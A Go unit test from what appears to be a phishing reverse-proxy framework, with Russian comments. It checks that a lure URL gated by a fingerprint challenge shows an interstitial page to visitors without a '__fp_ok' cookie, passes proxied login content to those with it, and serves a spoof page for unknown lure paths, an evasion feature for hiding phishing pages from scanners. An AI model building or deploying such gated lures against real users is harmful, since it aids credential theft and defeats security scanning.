package proxy

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
	"github.com/phantom-v2/phantom/internal/lures"
	"github.com/phantom-v2/phantom/internal/spoof"
)

// Challenge-гейт проходим: без cookie — interstitial, с cookie — контент.
func TestChallengeInterstitial(t *testing.T) {
	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatal(err)
	}
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<html><body>secret</body></html>`))
	}))
	defer up.Close()

	ls := lures.New()
	ls.Seed("labtest", "/l/test01")
	if err := ls.SmartCreate(lures.Smart{Path: "/l/gated", PhishletID: "labtest", MaxUses: 5, RequireChallenge: true}); err != nil {
		t.Fatal(err)
	}
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"origin.upstream.test": up.URL})
	eng.SetLures(ls)
	eng.SetChallengePage(spoof.Challenge)

	get := func(path string, fp bool) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodGet, "http://login.phish.test"+path, nil)
		uaHuman(req)
		if fp {
			req.AddCookie(&http.Cookie{Name: "__fp_ok", Value: "1"})
		}
		rec := httptest.NewRecorder()
		eng.ServeHTTP(rec, req)
		return rec
	}

	rec := get("/l/gated", false)
	if rec.Code != 200 || !strings.Contains(rec.Body.String(), "__fp.js") {
		t.Fatalf("interstitial: %d %q", rec.Code, rec.Body.String())
	}
	rec2 := get("/l/gated", true)
	if rec2.Code != 200 || !strings.Contains(rec2.Body.String(), "secret") {
		t.Fatalf("gated content: %d %q", rec2.Code, rec2.Body.String())
	}
	// левая приманка — по-прежнему spoof, не interstitial
	rec3 := get("/l/nope", false)
	if strings.Contains(rec3.Body.String(), "__fp.js") {
		t.Fatalf("unknown must spoof: %q", rec3.Body.String())
	}
}
